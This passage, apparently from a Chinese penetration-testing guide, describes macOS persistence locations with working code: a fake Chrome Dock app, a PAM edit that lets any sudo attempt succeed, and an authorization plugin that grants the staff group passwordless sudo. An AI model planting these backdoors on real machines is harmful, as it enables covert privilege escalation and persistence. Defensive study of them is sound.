文件名包含 queue、job number 以及计划执行的时间。例如，我们来看看 `a0001a019bdcd2`。

- `a` - 这是 queue
- `0001a` - 十六进制表示的 job number，`0x1a = 26`
- `019bdcd2` - 十六进制表示的时间。它代表自 epoch 以来经过的分钟数。`0x019bdcd2` 的十进制值为 `26991826`。将其乘以 60 后得到 `1619509560`，即 `GMT: 2021. April 27., Tuesday 7:46:00`。

如果我们打印 job file，会发现其中包含的信息与使用 `at -c` 得到的信息相同。

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- 但你需要能够使用参数调用 `osascript`，以联系 **`System Events`**，从而配置 Folder Actions
- TCC bypass：[🟠](https://emojipedia.org/large-orange-circle)
- 它具有一些基本的 TCC 权限，例如 Desktop、Documents 和 Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- 需要 Root 权限
- **Trigger**：访问指定文件夹
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**：访问指定文件夹

#### Description & Exploitation

Folder Actions 是由文件夹中的变化自动触发的脚本，例如添加、删除项目，或执行打开、调整文件夹窗口大小等其他操作。这些 actions 可用于执行各种任务，并且可以通过不同方式触发，例如使用 Finder UI 或终端命令。<sup>[[17]](#references)[[18]](#references)</sup>

要设置 Folder Actions，可以选择以下方式：

1. 使用 [Automator](https://support.apple.com/guide/automator/welcome/mac) 创建 Folder Action workflow，并将其安装为 service。
2. 通过文件夹上下文菜单中的 Folder Actions Setup 手动附加脚本。
3. 使用 OSAScript 向 `System Events.app` 发送 Apple Event 消息，以 programmatically 设置 Folder Action。
- 这种方法对于将 action 嵌入系统特别有用，可以提供一定程度的 persistence。

以下脚本是一个可由 Folder Action 执行的示例：
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
要使上述脚本可供 Folder Actions 使用，请使用以下命令进行编译：
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
脚本编译完成后，通过执行以下脚本设置 Folder Actions。该脚本将全局启用 Folder Actions，并将之前编译的脚本专门附加到桌面文件夹。
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
使用以下命令运行 setup script：
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- 这是通过 GUI 实现此 persistence 的方法：

这是将要执行的 script：
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
使用以下命令编译：`osacompile -l JavaScript -o folder.scpt source.js`

将其移动到：
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
然后，打开 `Folder Actions Setup` 应用，选择**要监视的文件夹**，并在你的情况下选择 **`folder.scpt`**（在我的情况下，我将其命名为 output2.scp）：

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

现在，如果你使用 **Finder** 打开该文件夹，你的 script 就会被执行。

此配置以 base64 格式存储在 **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** 中。

现在，让我们尝试在没有 GUI 访问权限的情况下准备此 persistence：

1. 将 **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** 复制到 `/tmp` 进行备份：
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **移除**刚刚设置的 Folder Actions：

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

现在我们拥有了一个空环境。

3. 复制备份文件：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. 打开 Folder Actions Setup.app 以加载此配置：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> 但这对我不起作用，以下是该 writeup 中的说明：

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- 但你需要在系统中安装一个 malicious application
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**：用户点击 Dock 中的应用时

#### Description & Exploitation

Dock 中显示的所有应用都在 plist 中指定：**`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

可以仅使用以下方式**添加一个应用**：
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
通过一些 **social engineering**，你可以在 dock 中 **impersonate for example Google Chrome**，并实际执行你自己的脚本：
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### 色彩选择器

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 必须执行一个非常特定的操作
- 最终会进入另一个 sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/Library/ColorPickers`
- 需要 root 权限
- 触发条件：使用色彩选择器
- `~/Library/ColorPickers`
- 触发条件：使用色彩选择器

#### 描述与 Exploit

**使用你的代码编译一个色彩选择器** bundle（例如可以使用[**这个**](https://github.com/viktorstrate/color-picker-plus)），并添加一个 constructor（如[屏幕保护程序部分](macos-auto-start-locations.md#screen-saver)所示），然后将 bundle 复制到 `~/Library/ColorPickers`。<sup>[[20]](#references)</sup>

然后，当色彩选择器被触发时，你的代码也会执行。

请注意，加载你的 library 的 binary 运行在一个**限制非常严格的 sandbox**中：`/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- 可用于绕过 sandbox：**不可以，因为你需要执行自己的 app**
- TCC bypass：???

#### 位置

- 特定 app

#### 描述与利用

一个包含 Finder Sync Extension 的应用示例[**可以在此处找到**](https://github.com/D00MFist/InSync)。

应用可以包含 `Finder Sync Extensions`。此扩展会被放入一个将要执行的应用中。此外，为了让扩展能够执行其代码，它**必须使用**某个有效的 Apple developer certificate **进行签名**，必须是**sandboxed**（尽管可以添加较宽松的例外），并且必须通过类似以下方式进行注册：<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但最终会进入一个常见的 application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/System/Library/Screen Savers`
- 需要 Root 权限
- **触发条件**：选择 screen saver
- `/Library/Screen Savers`
- 需要 Root 权限
- **触发条件**：选择 screen saver
- `~/Library/Screen Savers`
- **触发条件**：选择 screen saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 描述与 Exploit

在 Xcode 中创建一个新项目，并选择模板以生成新的 **Screen Saver**。然后将代码添加到其中，例如使用以下代码生成日志。<sup>[[23]](#references)[[24]](#references)</sup>

**Build** 它，然后将 `.saver` bundle 复制到 **`~/Library/Screen Savers`**。接着打开 Screen Saver GUI，只需点击它，就应该会生成大量日志：
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> 请注意，由于加载此代码的二进制文件（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）的 entitlements 中包含 **`com.apple.security.app-sandbox`**，因此你将处于**通用应用程序 sandbox**中。

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 但最终会处于 application sandbox 中
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- 该 sandbox 看起来限制非常多

#### Location

- `~/Library/Spotlight/`
- **Trigger**: 创建由 Spotlight plugin 管理扩展名的新文件。
- `/Library/Spotlight/`
- **Trigger**: 创建由 Spotlight plugin 管理扩展名的新文件。
- 需要 root 权限
- `/System/Library/Spotlight/`
- **Trigger**: 创建由 Spotlight plugin 管理扩展名的新文件。
- 需要 root 权限
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: 创建由 Spotlight plugin 管理扩展名的新文件。
- 需要新 app

#### Description & Exploitation

Spotlight 是 macOS 内置的搜索功能，旨在为用户提供**快速、全面地访问计算机上数据的能力**。\
为了实现这种快速搜索能力，Spotlight 会维护一个**专有数据库**，并通过**解析大多数文件**来创建索引，从而能够快速搜索文件名及其内容。<sup>[[25]](#references)</sup>

Spotlight 的底层机制涉及一个名为 `mds` 的中央进程，它代表**“metadata server”**。该进程负责协调整个 Spotlight 服务。除此之外，还有多个 `mdworker` daemons 执行各种维护任务，例如为不同文件类型建立索引（`ps -ef | grep mdworker`）。这些任务通过 Spotlight importer plugins（即 **“.mdimporter bundles”**）实现，使 Spotlight 能够理解并索引各种文件格式中的内容。

这些 plugins 或 **`.mdimporter`** bundles 位于前面提到的位置。如果出现新的 bundle，它会在一分钟内被加载（无需重启任何服务）。这些 bundles 需要声明它们能够管理的**文件类型和扩展名**，这样，当创建带有指定扩展名的新文件时，Spotlight 就会使用它们。

可以通过运行以下命令来**查找所有已加载的 `mdimporters`**：
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
例如，**/Library/Spotlight/iBooksAuthor.mdimporter** 用于解析此类文件（扩展名包括 `.iba` 和 `.book` 等）：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> 如果你检查其他 `mdimporter` 的 Plist，可能找不到 **`UTTypeConformsTo`** 条目。这是因为它属于内置的 _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier))，不需要指定扩展名。
>
> 此外，系统默认插件始终具有优先权，因此攻击者只能访问未被 Apple 自己的 `mdimporters` 索引的文件。

要创建自己的 importer，可以从这个项目开始：[https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)，然后修改名称和 **`CFBundleDocumentTypes`**，并添加 **`UTImportedTypeDeclarations`**，使其支持你希望支持的扩展名，并在 **`schema.xml`** 中反映这些更改。\
然后修改 **`GetMetadataForFile`** 函数的代码，使其在创建具有目标扩展名的文件时执行你的 payload。

最后，**构建并复制新的 `.mdimporter`** 到之前三个位置之一。你可以通过**监控日志**或运行 **`mdimport -L`** 来检查它是否已加载。

### ~~Preference Pane~~

> [!CAUTION]
> 看起来这已经无法正常工作了。

Writeup：[https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
- 需要特定的用户操作
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

看起来这已经无法正常工作了。<sup>[[26]](#references)</sup>

## Root Sandbox Bypass

> [!TIP]
> 这里可以找到一些适用于 **sandbox bypass** 的启动位置，它们允许你只需**将内容写入文件**即可执行某些操作，前提是拥有 **root** 权限和/或满足其他**特殊条件。**

### Periodic

Writeup：[https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
- 但你需要 root 权限
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`、`/etc/periodic/weekly`、`/etc/periodic/monthly`、`/usr/local/etc/periodic`
- 需要 root 权限
- **触发条件**：到达相应时间时
- `/etc/daily.local`、`/etc/weekly.local` 或 `/etc/monthly.local`
- 需要 root 权限
- **触发条件**：到达相应时间时

#### Description & Exploitation

执行 periodic 脚本（**`/etc/periodic`）是因为在 `/System/Library/LaunchDaemons/com.apple.periodic*` 中配置了 **launch daemons**。请注意，存储在 `/etc/periodic/` 中的脚本会以**文件所有者**的身份**执行**，因此这无法用于潜在的权限提升。<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
还有其他将被执行的周期性脚本，相关配置位于 **`/etc/defaults/periodic.conf`**：
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
如果你能够写入 `/etc/daily.local`、`/etc/weekly.local` 或 `/etc/monthly.local` 中的任何文件，它迟早都会被**执行**。

> [!WARNING]
> 注意，periodic script 将以其所有者的身份**执行**。因此，如果该 script 的所有者是普通用户，它就会以该用户的身份执行（这可能会阻止 privilege escalation attacks）。

### PAM

Writeup：[Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup：[https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
- 但你需要成为 root
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- 始终需要 root

#### Description & Exploitation

由于 PAM 更侧重于**persistence**和 malware，而不是在 macOS 中轻松执行，因此本文不会提供详细解释，**请阅读 writeups 以更好地理解此 technique**。<sup>[[28]](#references)</sup>

使用以下命令检查 PAM modules：
```bash
ls -l /etc/pam.d
```
一种滥用 PAM 的持久化/权限提升技术，只需修改模块 /etc/pam.d/sudo，并在开头添加以下一行即可：
```bash
auth       sufficient     pam_permit.so
```
所以它**看起来像**这样：
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
因此，任何使用 **`sudo` 的尝试都将成功**。

> [!CAUTION]
> 注意，此目录受 TCC 保护，因此用户很可能会看到请求访问权限的提示。

另一个很好的例子是 su，你可以看到，也可以向 PAM modules 传递参数（你也可以对这个文件植入后门）：
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
- 但你需要拥有 root 权限并进行额外配置
- TCC bypass：???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
- 需要 root 权限
- 还需要配置 authorization database 以使用该 plugin

#### Description & Exploitation

你可以创建一个 authorization plugin，在用户登录时执行它以维持 persistence。有关如何创建此类 plugin 的更多信息，请查看之前的 writeup（并注意，编写不当的 plugin 可能会导致你无法登录，此时需要从 recovery mode 清理你的 mac）。<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**将 bundle 移动到要加载的位置：**
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最后添加用于加载此 Plugin 的 **rule**：
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** 会告知授权框架需要**调用外部 mechanism 执行授权**。此外，**`privileged`** 会使其由 root 执行。

使用以下命令触发：
```bash
security authorize com.asdf.asdf
```
然后，**staff group 应具有 sudo** access（读取 `/etc/sudoers` 进行确认）。

### Man.conf

Writeup：[https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
- 但你需要是 root，且用户必须使用 man
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- 需要 root 权限
- **`/private/etc/man.conf`**：每当使用 man 时

#### Description & Exploit

配置文件 **`/private/etc/man.conf`** 指定了打开 man 文档文件时要使用的 binary/script。因此可以修改可执行文件的路径，使得用户每次使用 man 读取某些文档时，都会执行一个 backdoor。<sup>[[31]](#references)</sup>

例如，在 **`/private/etc/man.conf`** 中设置：
```
MANPAGER /tmp/view
```
然后将 `/tmp/view` 创建为：
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
- 但你需要拥有 root 权限，且 apache 必须正在运行
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)
- Httpd 没有 entitlements

#### 位置

- **`/etc/apache2/httpd.conf`**
- 需要 root 权限
- 触发条件：Apache2 启动时

#### 描述与利用

你可以在 `/etc/apache2/httpd.conf` 中通过添加类似以下内容的一行来指定加载某个模块：<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
这样，编译后的模块就会被 Apache 加载。唯一需要注意的是，你必须**使用有效的 Apple 证书对其进行签名**，或者需要**在系统中添加新的受信任证书**，并使用该证书**对其进行签名**。

然后，如有需要，为确保服务器会启动，可以执行：
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb 的代码示例：
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM 审计框架

文章：[https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
- 但你需要成为 root，auditd 正在运行，并触发警告
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/etc/security/audit_warn`**
- 需要 root 权限
- **触发条件**：当 auditd 检测到警告时

#### 描述与利用

每当 auditd 检测到警告时，脚本 **`/etc/security/audit_warn`** 就会被**执行**。因此，你可以将 payload 添加到其中。<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
你可以使用 `sudo audit -n` 强制触发警告。

### 启动项目

> [!CAUTION] > **此功能已弃用，因此这些目录中不应找到任何内容。**

**StartupItem** 是一个目录，应位于 `/Library/StartupItems/` 或 `/System/Library/StartupItems/` 中。创建此目录后，其中必须包含以下两个特定文件：

1. 一个 **rc script**：在启动时执行的 shell script。
2. 一个 **plist file**，具体名称为 `StartupParameters.plist`，其中包含各种配置设置。

确保 rc script 和 `StartupParameters.plist` 文件都正确放置在 **StartupItem** 目录中，以便启动过程能够识别并使用它们。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 我在我的 macOS 中找不到此组件，因此如需更多信息，请查看 writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

由 Apple 引入的 **emond** 是一种 logging 机制，似乎尚未充分开发，或可能已被放弃，但它仍然可以访问。对于 Mac administrator 来说，这项不太有用的 obscure service 可能会成为 threat actor 用于持久化的隐蔽方法，并且很可能不会被大多数 macOS admins 注意到。<sup>[[34]](#references)</sup>

对于了解其存在的人来说，识别 **emond** 的任何恶意使用都很简单。该服务的系统 LaunchDaemon 会在单个目录中查找要执行的 scripts。可以使用以下 command 对其进行检查：
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### 位置

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- 需要 Root 权限
- **触发条件**：使用 XQuartz

#### 描述与利用

XQuartz **已不再安装在 macOS 中**，因此如需更多信息，请查看该 Writeup。<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
